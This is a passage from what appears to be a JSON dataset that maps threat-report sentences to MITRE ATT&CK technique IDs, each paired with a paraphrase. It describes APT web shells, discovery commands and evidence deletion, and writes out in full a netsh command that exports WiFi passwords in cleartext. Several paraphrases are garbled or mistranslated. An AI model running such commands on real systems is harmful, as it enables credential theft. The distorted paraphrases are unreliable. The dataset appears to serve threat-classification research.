            "en_text": "One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\" They then gather more network information with a call to ipconfig and arp -a",
            "data_text": "After creating and running this local_update js file, one of the first steps the multiple Moscow installer packages performed was to export WiFi profiles (settings and passwords) of all local hosts to %APPDA.TA%\\<profile.xml(command line call: cmd) with command line call.exe/cnetshwlan export profile key=clear folder=filerAPPDATA%)\"Then use the call topipconfig and arp-a to gather more network information."
        }
    ],
    "Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings": [
        {
            "tec_id": "T1016",
            "en_text": "Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings",
            "data_text": "However, based on the dynamic and static analysis of malware samples associated with supservermgr [.com domain], we were able to see some unique artifacts that allowed us to expand the dataset and discover additional results."
        }
    ],
    "hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID": [
        {
            "tec_id": "T1016",
            "en_text": "hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID",
            "data_text": "hxxp://www.sanjosemaristas [.com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA} Provide the service name GUID of the current network adapter"
        }
    ],
    "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9": [
        {
            "tec_id": "T1016",
            "en_text": "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9",
            "data_text": "In Figure 9 below, red represents the target IP address, malware, registrar information, and domains associated with the target attack campaign, and blue represents the criminal attack IP address, used malware, registrar information, and domains. Figure 9"
        }
    ],
    "(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit": [
        {
            "tec_id": "T1016",
            "en_text": "(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit",
            "data_text": "(Source: Dell SecureWorks) As shown in Figure 10, the extracted JavaScript code represents an iframe pointing to the IP address hosting the exploit."
        }
    ],
    "(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address": [
        {
            "tec_id": "T1016",
            "en_text": "(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address",
            "data_text": "(Source: Dell SecureWorks) Appendix D — Domain Name Parking Case CTU researchers observed TG-3390 parking domains, with records A pointing to non-routable IP spaces, including 127.0.0.[x] Loopback Address"
        }
    ],
    "The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> … </table>    Table 1 Commands available within XAgent OSX The ‘showBackupIosFolder’ command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad": [],
    "Trickbot uses this encrypted module to scan the network and steal relevant network information.": [
        {
            "tec_id": "T1016",
            "en_text": "Trickbot uses this encrypted module to scan the network and steal relevant network information.",
            "data_text": "Trickbot uses this encrypted module to discover networks and steal relevant network information."
        }
    ],
    "ipconfig ": [
        {
            "tec_id": "T1016",
            "en_text": "ipconfig ",
            "data_text": "ipconfig"
        }
    ],
    " nbtstat ": [
        {
            "tec_id": "T1016",
            "en_text": " nbtstat ",
            "data_text": "nbtstat"
        }
    ],
    " net config": [
        {
            "tec_id": "T1016",
            "en_text": " net config",
            "data_text": "net config"
        }
    ],
    "It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers": [
        {
            "tec_id": "T1505.003",
            "en_text": "It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers",
            "data_text": "It is the preferred platform within the data center and cloud for enterprises, and continues to be the preferred platform for most Internet-facing web and application servers."
        }
    ],
    "Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources": [
        {
            "tec_id": "T1505.003",
            "en_text": "Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources",
            "data_text": "The group also regularly identified and exploited vulnerable web servers in the target organization to install web shells such as ANAK and ASPXSPY, and compromised Outlook Web Access (OWA) resources encountered externally using stolen legitimate credentials."
        }
    ],
    "Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises": [
        {
            "tec_id": "T1505.003",
            "en_text": "Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises",
            "data_text": "Attack Lifecycle Early Performance Degradation The APT40 has been found to utilize a variety of early performance degradation technologies, including web server exploitation, publicly available customized backdoor phishing campaigns, and strategic web degradation."
        }
    ],
    "APT40 relies heavily on web shells for an initial foothold into an organization": [
        {
            "tec_id": "T1505.003",
            "en_text": "APT40 relies heavily on web shells for an initial foothold into an organization",
            "data_text": "The APT40 relies heavily on the web shell to gain an early foothold in the organization."
        }
    ],
    "Web shells are heavily relied on for nearly all stages of the attack lifecycle": [
        {
            "tec_id": "T1505.003",
            "en_text": "Web shells are heavily relied on for nearly all stages of the attack lifecycle",
            "data_text": "Web shells rely heavily on almost every stage of the attack lifecycle."
        }
    ],
    "Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups": [
        {
            "tec_id": "T1505.003",
            "en_text": "Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups",
            "data_text": "Internal Web servers are more vulnerable to exploitation of APT40 and similarly sophisticated groups because they are not configured with the same security controls as public Web servers."
        }
    ],
    "Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment": [
        {
            "tec_id": "T1505.003",
            "en_text": "Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment",
            "data_text": "The Maintenance Presence APT40 maintains its presence within the victim's environment, primarily using back doors, including web shells."
        }
    ],
    "APT40 strongly favors web shells for maintaining presence, especially publicly available tools": [
        {
            "tec_id": "T1505.003",
            "en_text": "APT40 strongly favors web shells for maintaining presence, especially publicly available tools",
            "data_text": "The APT40 is particularly fond of web shells to maintain its presence, such as publicly available tools."
        }
    ],
    "OwaAuth — This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter": [
        {
            "tec_id": "T1505.003",
            "en_text": "OwaAuth — This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter",
            "data_text": "OwaAuth - This web shell and credential stealer deployed on Microsoft Exchange servers is installed as an ISAPI filter."
        }
    ],
    "(Source: SecureWorks)  China Chopper web shell — This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: SecureWorks)  China Chopper web shell — This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers",
            "data_text": "(Source: SecureWorks) China Chopper Web Shell — This web-based executable script communicates with a fully functional user interface to allow threaters to transfer and create files, open command terminals, and interact with database servers."
        }
    ],
    "(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment",
            "data_text": "(Source: SecureWorks) In several cases, CTU researchers observed the results of using feature shells to access the environment after an attempt to create a web shell failed with web-accessible JBOSS-based service desk software."
        }
    ],
    "(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion",
            "data_text": "(Source: SecureWorks) After BROUND UNION was removed from a compromised environment associated with blocking the group's known infrastructure, CTU researchers observed that the group attempted to reconnect to the OWA and backup web shells deployed during the intrusion."
        }
    ],
    "To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities": [
        {
            "tec_id": "T1505.003",
            "en_text": "To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities",
            "data_text": "To report an intrusion and request resources for incident response or technical assistance, contact the FBI or FBI Cyber Department at CyWatch@fbi.gov or 855-292-3937 via your local field office at NCCICCustomerService@hq.dhs.gov or 888-282-0870.To protect against SQL injection and other attacks on web services, system operators should regularly assess known and published vulnerabilities, perform software and technical updates, and audit external systems for known web application vulnerabilities."
        }
    ],
    "They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers": [
        {
            "tec_id": "T1505.003",
            "en_text": "They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers",
            "data_text": "In addition, to reduce the risk of network intrusion with this vector, the following steps must be taken to strengthen the web application and the server hosting it.Use an available firewall to block attacks.Perform Windows system security steps such as Microsoft's Enhanced Mitigation Toolkit (EMET) and Microsoft AppLocker installation and configuration.Monitor and remove unauthenticated code in the www directory.Disable, suspend, or inhibit the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from the Web server"
        }
    ],
    "Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services": [
        {
            "tec_id": "T1505.003",
            "en_text": "Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services",
            "data_text": "Typical web servers and applications require only GET, POST, and HEAD.Minimize server fingerprints by configuring the Web server to avoid responding with banners that identify the server software and version number, if possible.Protect both operating systems and applications.Update and patch production servers regularly.Disable potentially harmful SQL stored procedure calls.Checks and validates that the input is entered correctly and does not contain escape codes.Consider using type safe storage procedures and prepared sentences.Periodically audit transaction logs for suspicious activity.Perform penetration tests in the web service.The error message is common and does not expose too much information.Permissions, Permissions, and Access Control System operators must perform the following steps to restrict permissions, permissions, and access control:Reduce the permissions to only the permissions required for the user's actions.Limits the ability (permissions) of users to install and run unwanted software applications and applies the \"minimum privileges\" principle to all systems and services."
        }
    ],
    "Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell": [
        {
            "tec_id": "T1505.003",
            "en_text": "Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell",
            "data_text": "Also at the same URL, http://mdz2019.noip[.cn:3654/] is used to distribute more versions of this Gh0stRAT sample with a .zip file containing the webshell, ASPXSpy."
        }
    ],
    "Audit ISAPI filters and search for web shells on Microsoft Exchange servers": [
        {
            "tec_id": "T1505.003",
            "en_text": "Audit ISAPI filters and search for web shells on Microsoft Exchange servers",
            "data_text": "Audit ISAPI Filter and Search for Web Shells on Microsoft Exchange Servers"
        }
    ],
    "ChinaChopper web shell": [
        {
            "tec_id": "T1505.003",
            "en_text": "ChinaChopper web shell",
            "data_text": "China Chopper Web Shell"
        }
    ],
    "(Source: Dell SecureWorks) Passwords, like \"admin-na-google123!@#\" shown in Figure 4, are required to interact with the web shell": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: Dell SecureWorks) Passwords, like \"admin-na-google123!@#\" shown in Figure 4, are required to interact with the web shell",
            "data_text": "(Source: Dell SecureWorks) Password: \"admin-na-google123!@#\" Required to interact with the web shell as shown in Figure 4."
        }
    ],
    "TG-3390 has used additional web shells containing similarly formatted passwords": [
        {
            "tec_id": "T1505.003",
            "en_text": "TG-3390 has used additional web shells containing similarly formatted passwords",
            "data_text": "The TG-3390 used an additional web shell containing a password of a similar format."
        }
    ],
    "However, the OwaAuth web shell password contains the victim organization's name": [
        {
            "tec_id": "T1505.003",
            "en_text": "However, the OwaAuth web shell password contains the victim organization's name",
            "data_text": "However, the OwaAuth web shell password contains the name of the victim organization."
        }
    ],
    "More information about the OwaAuth web shell is available in Appendix C": [
        {
            "tec_id": "T1505.003",
            "en_text": "More information about the OwaAuth web shell is available in Appendix C",
            "data_text": "For more information on the OwaAuth web shell, see Appendix C."
        }
    ],
    "ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6)": [
        {
            "tec_id": "T1505.003",
            "en_text": "ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6)",
            "data_text": "ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6)"
        }
    ],
    "ASPXTool web shell": [
        {
            "tec_id": "T1505.003",
            "en_text": "ASPXTool web shell",
            "data_text": "ASPTool Web Shell"
        }
    ],
    "The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size": [
        {
            "tec_id": "T1505.003",
            "en_text": "The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size",
            "data_text": "The OwaAuth webshell is likely to be created as a builder, given that the PE compilation time of the binary does not change between instances and the configuration field is padded to a specific size."
        }
    ],
    "The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells": [
        {
            "tec_id": "T1505.003",
            "en_text": "The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells",
            "data_text": "Adversaries modify publicly available tools, such as ASPXSpy, to remove identification attributes that network defenders use to identify web shells."
        }
    ],
    "TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter": [
        {
            "tec_id": "T1505.003",
            "en_text": "TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter",
            "data_text": "The TG-3390 actor deployed the OwaAuth webshell to the Exchange server to disguise it as an ISAPI filter."
        }
    ],
    "They then identify the Exchange server and attempt to install the OwaAuth web shell": [
        {
            "tec_id": "T1505.003",
            "en_text": "They then identify the Exchange server and attempt to install the OwaAuth web shell",
            "data_text": "Then identify the Exchange server and attempt to install the OwaAuth web shell."
        }
    ],
    "If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells": [
        {
            "tec_id": "T1505.003",
            "en_text": "If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells",
            "data_text": "If the OwaAuth web shell is not valid because the victim uses dual authentication for web mail, the attacker identifies other servers that can be accessed externally and deploys the ChinaChoper web shell."
        }
    ],
    "(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS",
            "data_text": "(Source: Dell SecureWorks) Deploys the ASPTool webshell on internally accessible systems running IIS to facilitate lateral movement."
        }
    ],
    "Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers": [
        {
            "tec_id": "T1505.003",
            "en_text": "Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers",
            "data_text": "Mapping interactions between TG-3390 and webshells during intrusions answered by CTU researchers"
        }
    ],
    "OwaAuth web shell PDB string": [
        {
            "tec_id": "T1505.003",
            "en_text": "OwaAuth web shell PDB string",
            "data_text": "OwaAuth Web Shell PDB String"
        }
    ],
    "Each web shell instance is configured to contain SP, Key, and Log variables": [
        {
            "tec_id": "T1505.003",
            "en_text": "Each web shell instance is configured to contain SP, Key, and Log variables",
            "data_text": "Each Web shell instance is configured to include SP, Key, and Log variables."
        }
    ],
    "OwaAuth web shell command set": [
        {
            "tec_id": "T1505.003",
            "en_text": "OwaAuth web shell command set",
            "data_text": "OwaAuth Web Shell Command Set"
        }
    ],
    "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..": [
        {
            "tec_id": "T1505.003",
            "en_text": "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..",
            "data_text": "styles.aspx webshell provides significant functionality because the developer wrote this webshell with JScript, which executes all JScript code provided within an HTTP request."
        }
    ],
    "The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)": [
        {
            "tec_id": "T1010",
            "en_text": "The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)",
            "data_text": "Most enterprises still maintain a Windows-centric user experience where certain core infrastructure components work on Windows servers (such as Active Directory, SharePoint, and so on)."
        }
    ],
    "The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at “%temp%\\Save.tmp”": [
        {
            "tec_id": "T1010",
            "en_text": "The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at “%temp%\\Save.tmp”",
            "data_text": "The MPK IRC bot monitors the active application window and writes the title of the open window to a file of %temp% with recorded keystrokes.Save.tmp\""
        }
    ],
    "The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: “Gmail -” “Yahoo – login” “Sign In -” “Outlook.com -“ MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the “Save.tmp” file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used": [
        {
            "tec_id": "T1010",
            "en_text": "The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: “Gmail -” “Yahoo – login” “Sign In -” “Outlook.com -“ MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the “Save.tmp” file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used",
            "data_text": "MPK Trojan Horse \"Gmail -\", \"Yahoo – login\", \"Sign In -\", \"Outlook.com -\" MPK parses these window titles to identify the relevant email address and attempts to write it to the log file using:ng format: ///////////////// Find Mail <email address> /////// If the Trojan does not find a window title related to Gmail, Yahoo, or Outlook, save the title in the \"Save.tmp\" file in the following format: +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
        }
    ],
    "Because of Poseidon’s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others": [
        {
            "tec_id": "T1010",
            "en_text": "Because of Poseidon’s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others",
            "data_text": "Due to Poseidon's lifetime, there are samples targeted at Windows NT 4.0 servers and Windows 95 workstations, as well as server variants (focused on reaching domain controllers in enterprise environments). How is it different from other targeted attacks? The extortion elements of this campaign are those that differentiate themselves from others."
        }
    ],
    "Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f – 47)   0x4d Field 1 – Windows major version (0x6 – Windows Vista+)   0x51 Field 2 – Windows minor version (0x1 – Windows 7)   0x55 Field 3 – Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 – Beacon structure for PLAINTEE": [
        {
            "tec_id": "T1010",
            "en_text": "Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f – 47)   0x4d Field 1 – Windows major version (0x6 – Windows Vista+)   0x51 Field 2 – Windows minor version (0x1 – Windows 7)   0x55 Field 3 – Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 – Beacon structure for PLAINTEE",
            "data_text": "Offset Description 0x0 Victim GUID (8C8CED9-4326-4326-448B-919E-249)EEC0238A3) 0x25 Victim IP Address (192.168.180.154) 0x45 Command (0x66660001) 0x49 Payload Length (0x2f – 47) 0x4d Field 1 – Windows Major Version (06 – 0x5 Field 0x5 Field 0x5 0x5 0x5 - Windows Vista 0x5 0x5 0x5 - 0x5 0x5 - Minor"
        }
    ],
    "Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product": [
        {
            "tec_id": "T1070.004",
            "en_text": "Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product",
            "data_text": "Although Linux malware detection and blocking are not widely available today, Palo Alto Networks customers are protected by IPS Signature 14917—the next generation security platform. IPS Signature 14917 deployed to identify and prevent command and control operations, C2 domains and files mentioned in this report are blocked by the Threat Prevention product."
        }
    ],
    "Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis": [
        {
            "tec_id": "T1070.004",
            "en_text": "Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis",
            "data_text": "Destroy evidence: Securely delete logs and deploy and run disk erase malware to protect tracks and stop forensic analysis."
        }
    ],
    "The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and unfortunately couldn’t restore them after they were deleted": [
        {
            "tec_id": "T1070.004",
            "en_text": "The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and unfortunately couldn’t restore them after they were deleted",
            "data_text": "The organization scanned hosted scripts on the server before BE/SandWormgang deleted them, but unfortunately, it could not be restored after deletion."
        }
    ],
    "For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network": [
        {
            "tec_id": "T1070.004",
            "en_text": "For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network",
            "data_text": "For example, at the end of 2016, CTU researchers observed threat actors using native system capabilities to disable the logging process and delete logs within the network."
        }
    ],
    "After running within the %TEMP% path, Comnie will delete the original file": [
        {
            "tec_id": "T1070.004",
            "en_text": "After running within the %TEMP% path, Comnie will delete the original file",
            "data_text": "Comnie deletes the source file after it runs in the %TEMP% path."
        }
    ],
    "KEYS Deletes the file named by tempPath + “ky” file so as not to upload anything": [
        {
            "tec_id": "T1070.004",
            "en_text": "KEYS Deletes the file named by tempPath + “ky” file so as not to upload anything",
            "data_text": "Delete the file named KEYStempPath + \"ky\" file so that nothing is uploaded."
        }
    ],
    "LANS Deletes the file created by the LAN command to reverse the effect": [
        {
            "tec_id": "T1070.004",
            "en_text": "LANS Deletes the file created by the LAN command to reverse the effect",
            "data_text": "Delete the file generated by the LANS LAN command to reverse the effect."
        }
    ],
    "USBS Deletes the file created by the USB command to reverse the effect": [
        {
            "tec_id": "T1070.004",
            "en_text": "USBS Deletes the file created by the USB command to reverse the effect",
            "data_text": "Delete the file generated by the USBS USB command to reverse the effect."
        }
    ],
    "HDS Deletes the file created by the HD command to reverse the effect": [
        {
            "tec_id": "T1070.004",
            "en_text": "HDS Deletes the file created by the HD command to reverse the effect",
            "data_text": "Delete the file generated by the HDS HD command to reverse the effect."
        }
    ],
    "DEL-TEMP Deletes all files in the “AppData/Local/Temp” path": [
        {
            "tec_id": "T1070.004",
            "en_text": "DEL-TEMP Deletes all files in the “AppData/Local/Temp” path",
            "data_text": "Delete all files in the DEL-TEMP \"AppData/Local/Temp\" path."
        }
    ],
    "Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.   Delete files using the DeleteFile() API Load an arbitrary library into its process space": [
        {
            "tec_id": "T1070.004",
            "en_text": "Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.   Delete files using the DeleteFile() API Load an arbitrary library into its process space",
            "data_text": "Overwrite files with 0 and mark files to be deleted on reboot Clear files with 0 and mark files to be deleted on reboot Load arbitrary libraries into the file delete process space using the DeleteFile() API"
        }
    ],
    "The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration": [
        {
            "tec_id": "T1070.004",
            "en_text": "The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration",
            "data_text": "Depending on your configuration, SHAPESHIFT malware can erase disks, erase volumes, and delete files."
        }
    ],
    "Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase": [
        {
            "tec_id": "T1070.004",
            "en_text": "Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase",
            "data_text": "Appendix Malware Family Description Malware Family Description Availability TROPSHIFT Backdoor and SHAPESHIFT Wiper Malware Private Nanocore RAT (Public Available Remote Access Trojan) have been observed to be deleted and executed."
        }
    ],
    "DEL Deletes a specified file": [
        {
            "tec_id": "T1070.004",
            "en_text": "DEL Deletes a specified file",
            "data_text": "DEL Deletes the specified file."
        }
    ],
    "The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful": [
        {
